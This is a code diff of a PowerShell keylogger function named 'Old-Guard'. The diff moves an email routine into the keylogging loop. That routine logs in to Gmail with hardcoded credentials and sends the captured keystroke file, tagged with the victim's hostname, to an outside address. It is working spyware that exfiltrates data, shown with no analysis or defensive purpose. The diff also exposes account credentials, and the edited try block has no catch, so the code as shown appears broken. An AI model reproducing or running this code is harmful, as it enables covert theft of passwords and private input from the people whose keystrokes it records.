@@ -140,6 +140,22 @@ function Old-Guard {
                 $ImportDll = $TypeBuilder.CreateType()
             }
 
+           Start-Sleep -Seconds $EmailInterval
+           try
+           {
+               $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
+               $SMTPInfo.EnableSsl = $true
+               $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('logsandstuff12', 'usedrubberducky')
+               $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'logsandstuff12@gmail.com' 
+               $ReportEmail.To.Add('warof1846@gmail.com')
+               $ReportEmail.Subject = 'Final Report - ' +[System.Net.Dns]::GetHostByName(($env:computerName)).HostName
+               $ReportEmail.Body = 'Report 001'
+               $ReportEmail.Attachments.Add('%temp%/key_final.txt')
+               $SMTPInfo.Send($ReportEmail)
+               $SMTPInfo.Send($ReportEmail)
+            }
+             
+
             Start-Sleep -Milliseconds $PollingInterval
 
                 try
@@ -220,24 +236,12 @@ function Old-Guard {
                 catch {}
             }
             
-    function mailer {
-    Start-Sleep -Seconds $EmailInterval
-      $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
-      $SMTPInfo.EnableSsl = $true
-      $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('logsandstuff12', 'usedrubberducky')
-      $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'logsandstuff12@gmail.com' 
-      $ReportEmail.To.Add('warof1846@gmail.com')
-      $ReportEmail.Subject = 'Final Report - ' +[System.Net.Dns]::GetHostByName(($env:computerName)).HostName
-      $ReportEmail.Body = 'Report 001'
-      $ReportEmail.Attachments.Add('%temp%/key_final.txt')
-      $SMTPInfo.Send($ReportEmail)
-      $SMTPInfo.Send($ReportEmail)
-      } 
+
     }
 
     $Initilizer = [ScriptBlock]::Create(($Initilizer -replace 'REPLACEME', $LogPath))
 
-    Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {KeyLog} , {mailer}} -Name keylog $Initil | Out-Null
+    Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {KeyLog}} -Name keylog $Initil | Out-Null
 
     if ($PSBoundParameters['CollectionInterval'])
     {
